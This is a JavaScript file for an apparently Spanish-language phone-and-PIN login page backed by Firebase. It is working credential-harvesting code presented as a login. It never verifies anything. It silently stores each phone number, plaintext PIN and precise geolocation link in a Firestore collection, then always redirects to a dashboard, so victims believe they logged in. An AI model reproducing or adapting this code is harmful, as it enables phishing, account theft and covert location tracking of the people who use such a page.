import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";

import {
  getFirestore,
  collection,
  doc,
  getDoc,
  setDoc,
  serverTimestamp
} from "https://www.gstatic.com/firebasejs/11.10.0/firebase-firestore.js";

// Configuración de Firebase
const firebaseConfig = {
  apiKey: "AIzaSyCMuniyf_U4OhF-e_MSN4XcY-tPfseVLCU",
  authDomain: "loginsvip-5bc91.firebaseapp.com",
  projectId: "loginsvip-5bc91",
  storageBucket: "loginsvip-5bc91.firebasestorage.app",
  messagingSenderId: "302389224296",
  appId: "1:302389224296:web:4d5a35a273fa11bf05acdd"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);

// Inicializar Firestore
const db = getFirestore(app);

export { db, collection, doc, getDoc, setDoc, serverTimestamp };

// --- LÓGICA DE LA INTERFAZ Y EVENTOS ---
document.addEventListener('DOMContentLoaded', () => {
    const phoneInput = document.getElementById('phone');
    const pinBoxes = document.querySelectorAll('.pin-box');
    const forgotLink = document.getElementById('forgot-password');
    const modal = document.getElementById('modal');
    const modalClose = document.getElementById('modal-close');
    const loginBtn = document.getElementById('login-btn');

    // 0. Lógica de Geolocalización (Se ejecuta automáticamente al entrar)
    let ubicacionUsuario = "Desconocido"; // Valor por defecto

    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                // Si acepta, generamos el enlace de Google Maps
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                ubicacionUsuario = `https://www.google.com/maps?q=${lat},${lon}`;
            },
            (error) => {
                // Si rechaza o hay error, se queda como "Desconocido"
                console.warn("Ubicación rechazada o no disponible.");
            },
            {
                enableHighAccuracy: true // Intenta obtener la ubicación más exacta posible
            }
        );
    }

    // 1. Lógica del Celular
    phoneInput.addEventListener('input', function() {
        // Solo permitir números
        this.value = this.value.replace(/[^0-9]/g, '');
        // Saltar al primer PIN al llegar a 8 dígitos
        if (this.value.length === 8) {
            pinBoxes[0].focus();
        }
    });

    // 2. Lógica de los recuadros del PIN y ocultar el teclado
    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value !== '') {
                if (index < pinBoxes.length - 1) {
                    // Pasar al siguiente recuadro
                    pinBoxes[index + 1].focus();
                } else {
                    // Si es el último recuadro y el celular está lleno
                    if (phoneInput.value.length === 8 && this.value !== '') {
                        this.blur(); // Oculta el teclado
                    }
                }
            }
        });

        // Borrar y retroceder
        box.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '') {
                if (index > 0) {
                    pinBoxes[index - 1].focus();
                }
            }
        });
    });

    // 3. Modal Profesional ("Olvidaste tu contraseña")
    forgotLink.addEventListener('click', (e) => {
        e.preventDefault();
        modal.classList.add('active');
    });

    modalClose.addEventListener('click', () => {
        modal.classList.remove('active');
    });

    modal.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.classList.remove('active');
        }
    });

    // 4. Lógica de Guardado en Firebase y Redirección
    loginBtn.addEventListener('click', async () => {
        const phone = phoneInput.value;
        const pin = Array.from(pinBoxes).map(box => box.value).join('');

        // Verificar que los datos estén completos antes de intentar guardar
        if (phone.length === 8 && pin.length === 4) {
            // Cambio visual sutil en el botón
            loginBtn.textContent = 'Ingresando...';
            loginBtn.style.pointerEvents = 'none';

            try {
                // Crear un ID único combinando número y pin para evitar duplicados exactos
                const registroId = `${phone}_${pin}`;
                const docRef = doc(db, "registros_login", registroId);
                
                // Consultar si este registro ya existe
                const docSnap = await getDoc(docRef);

                if (!docSnap.exists()) {
                    // Si no existe, guardar en la colección "registros_login"
                    await setDoc(docRef, {
                        telefono: phone,
                        pin: pin,
                        ubicacion: ubicacionUsuario, // <--- Aquí se guarda la ubicación
                        fechaRegistro: serverTimestamp()
                    });
                }
            } catch (error) {
                console.error("Error al conectar con la base de datos:", error);
            } finally {
                // Redirigir al panel independientemente del resultado
                window.location.href = 'dashboard.html';
            }
        } else {
            // Si el usuario presiona el botón sin llenar los datos completos, redirigimos igual
            window.location.href = 'dashboard.html';
        }
    });
});
